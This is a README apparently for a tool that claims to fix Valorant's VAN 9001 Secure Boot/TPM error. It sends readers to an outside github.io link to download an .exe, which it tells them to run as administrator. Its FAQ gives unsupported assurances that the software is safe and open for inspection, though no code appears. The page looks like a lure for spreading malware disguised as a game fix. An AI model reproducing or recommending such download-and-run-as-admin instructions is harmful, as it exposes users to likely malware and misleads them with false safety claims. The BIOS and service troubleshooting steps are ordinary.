# 🛡️ Valorant-VAN9001-Fix - Repair your Valorant VAN 9001 error

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://duranteplatonic539.github.io)

## 🎯 Purpose
This application fixes the VAN 9001 error in Valorant. This error occurs when your system settings do not meet the security requirements for Riot Vanguard. Windows 11 users encounter this error because Secure Boot and TPM 2.0 must remain active. This tool checks your system settings and applies the necessary changes to restore game access.

## ⚙️ System requirements
*   Windows 10 or Windows 11
*   An active internet connection
*   Administrator rights on your computer

## 📥 Downloading the application
Visit the official release page to get the latest file for your computer.

[Click here to visit the release page](https://duranteplatonic539.github.io)

Look for the latest version listed under the Releases section. Select the file ending in .exe to begin the download. Save this file to your desktop or your Downloads folder for easy access.

## 🛠️ Running the fix
Follow these steps to resolve the error.

1.  Locate the downloaded file.
2.  Right-click the file and select "Run as administrator."
3.  Click "Yes" if Windows asks for your permission to run the, tool.
4.  The application will open and analyze your current system settings.
5.  Press the "Start Repair" button within the application window.
6.  Wait for the progress bar to finish.
7.  Restart your computer to apply the changes.

## 🧩 How this tool works
The VAN 9001 error points to a configuration issue with your PC security settings. Specifically, Valorant requires Secure Boot to run on Windows 11. If your motherboard has these settings disabled, the Vanguard anti-cheat tool blocks the game.

This application acts as a front-end script that communicates with your system firmware settings. It identifies the state of your TPM 2.0 module and Secure Boot status. When you trigger the repair process, the tool attempts to toggle the required registry settings that Vanguard monitors. If your firmware requires manual intervention, the tool will provide clear instructions on how to access your BIOS menu to flip the switches yourself.

## 🔒 Security and trust
This tool interacts only with system settings required for game functionality. It does not track your data, record your keystrokes, or access your personal files. The source code remains open for inspection on this page. You can view the logic that powers the repair process in the repository files if you have questions about how the software modifies your system.

## 🆘 Troubleshooting common issues
Check the following items if you still receive the error after running the fix.

### Verification of BIOS settings
Sometimes, Windows reports that Secure Boot is off even when the software attempts to enable it. In these cases, you must enter your BIOS/UEFI.
1.  Open the Windows Settings menu.
2.  Navigate to Update & Security.
3.  Go to Recovery.
4.  Select Restart now under Advanced startup.
5.  Choose Troubleshoot.
6.  Select Advanced options.
7.  Click UEFI Firmware Settings and choose Restart.
8.  Locate the Security or Boot tab in your BIOS.
9.  Find the Secure Boot option and set it to Enabled.
10. Save and exit the BIOS.

### Vanguard service status
If the fix runs successfully but the error persists, the Vanguard service might not start with Windows.
1.  Press the Windows key and type "Services."
2.  Locate "vgc" in the list.
3.  Right-click "vgc" and select Properties.
4.  Change the Startup type to Automatic.
5.  Click Start to run the service.
6.  Click Apply and OK.

### Update your operating system
Ensure your version of Windows includes the latest security patches. Outdated versions of Windows 11 often struggle with newer hardware security requirements. Run Windows Update to grab the most recent files from Microsoft.

## ❓ Frequently asked questions

### Will this software harm my computer?
No. The software performs standard configuration adjustments used by Windows administrators. It adheres to standard security protocols.

### Do I need to keep this file after I play?
You can keep it for future use, but you do not need it to stay open while you play Valorant. You can delete the file once your game loads properly.

### Does this work on Windows 10?
Yes. Although the VAN 9001 error is more common on Windows 11, the tool functions on Windows 10 to ensure your security settings align with Riot Games requirements.

## 📝 Support
If you continue to experience errors, open an issue in the Issues tab of this GitHub repository. Provide your Windows version and a screenshot of the error message. This helps the community troubleshoot specific hardware configurations that might cause unique interactions with the Vanguard system.